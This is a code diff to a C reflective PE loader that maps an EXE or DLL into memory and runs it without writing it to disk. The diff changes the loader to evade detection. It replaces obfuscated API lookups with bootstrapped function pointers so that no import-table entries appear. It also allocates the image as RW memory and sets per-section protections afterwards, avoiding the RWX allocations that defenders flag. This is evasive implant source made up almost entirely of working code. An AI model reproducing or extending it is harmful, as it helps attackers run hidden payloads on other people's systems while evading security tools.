@@ -3,7 +3,7 @@
  *
  * Loads a raw PE image (EXE or DLL) into the current process entirely
  * from memory, without touching disk:
- *   1. Allocate RWX memory for the image (prefer ImageBase, fall back anywhere)
+ *   1. Allocate RW memory for the image (prefer ImageBase, fall back anywhere)
  *   2. Copy PE headers + sections
  *   3. Apply base relocations (delta = allocated_base − preferred_base)
  *   4. Resolve import table via LoadLibraryA + GetProcAddress
@@ -63,9 +63,6 @@ static void ApplyRelocs(BYTE *base, LONGLONG delta,
 }
 
 /* ── Step 4: import resolution ────────────────────────────────────────────── */
-
-typedef HMODULE (WINAPI *pfnLoadLibraryA_t)(LPCSTR);
-typedef FARPROC (WINAPI *pfnGetProcAddress_t)(HMODULE, LPCSTR);
 
 static BOOL ResolveImports(BYTE *base, PIMAGE_DATA_DIRECTORY impDir,
                             pfnLoadLibraryA_t pLL,
@@ -135,25 +132,22 @@ BOOL ReflectiveLoad(const BYTE *peData, SIZE_T peSize, PVOID param, BOOL isDll) 
     PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(peData + dos->e_lfanew);
     if (nt->Signature != IMAGE_NT_SIGNATURE)  return FALSE;
 
-    /* Resolve LoadLibraryA + GetProcAddress via GetModuleHandleA (already loaded) */
-    HMODULE hK32 = GetModuleHandleA(OBFSTR("kernel32.dll"));
-    if (!hK32) return FALSE;
-    pfnLoadLibraryA_t  pLL  = (pfnLoadLibraryA_t)(FARPROC)
-        GetProcAddress(hK32, OBFSTR("LoadLibraryA"));
-    pfnGetProcAddress_t pGPA = (pfnGetProcAddress_t)(FARPROC)
-        GetProcAddress(hK32, OBFSTR("GetProcAddress"));
+    /* Use bootstrapped function pointers — no static IAT entry needed */
+    pfnLoadLibraryA_t   pLL  = (pfnLoadLibraryA_t)g_LoadLibraryA;
+    pfnGetProcAddress_t pGPA = (pfnGetProcAddress_t)g_GetProcAddress;
     if (!pLL || !pGPA) return FALSE;
 
     SIZE_T imageSize = nt->OptionalHeader.SizeOfImage;
 
-    /* Step 1 — allocate: try preferred base first, then anywhere */
+    /* Step 1 — allocate RW: try preferred base first, then anywhere.
+     * RWX is avoided; per-section protections are applied after load. */
     PVOID base = (PVOID)nt->OptionalHeader.ImageBase;
     NTSTATUS st = NtAlloc((HANDLE)(LONG_PTR)-1, &base, imageSize,
-                          PAGE_EXECUTE_READWRITE);
+                          PAGE_READWRITE);
     if (!NT_SUCCESS(st)) {
         base = NULL;
         st = NtAlloc((HANDLE)(LONG_PTR)-1, &base, imageSize,
-                     PAGE_EXECUTE_READWRITE);
+                     PAGE_READWRITE);
         if (!NT_SUCCESS(st)) return FALSE;
     }
 
@@ -188,6 +182,26 @@ BOOL ReflectiveLoad(const BYTE *peData, SIZE_T peSize, PVOID param, BOOL isDll) 
 
     /* Step 5 — TLS */
     RunTLS(img, &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS]);
+
+    /* Step 5b — harden: apply per-section memory protections (RW → characteristic) */
+    {
+        PIMAGE_NT_HEADERS ntImg = (PIMAGE_NT_HEADERS)(img + ((PIMAGE_DOS_HEADER)img)->e_lfanew);
+        PIMAGE_SECTION_HEADER secImg = IMAGE_FIRST_SECTION(ntImg);
+        WORD nSecImg = ntImg->FileHeader.NumberOfSections;
+        ULONG oldProt;
+        /* headers → read-only */
+        NtProtect((HANDLE)(LONG_PTR)-1, img,
+                  ntImg->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &oldProt);
+        /* each section → its characteristic-derived protection */
+        for (WORD i = 0; i < nSecImg; i++) {
+            if (!secImg[i].VirtualAddress || !secImg[i].Misc.VirtualSize) continue;
+            NtProtect((HANDLE)(LONG_PTR)-1,
+                      img + secImg[i].VirtualAddress,
+                      secImg[i].Misc.VirtualSize,
+                      SectionProt(secImg[i].Characteristics),
+                      &oldProt);
+        }
+    }
 
     /* Step 6 — entry point */
     DWORD epRVA = nt->OptionalHeader.AddressOfEntryPoint;
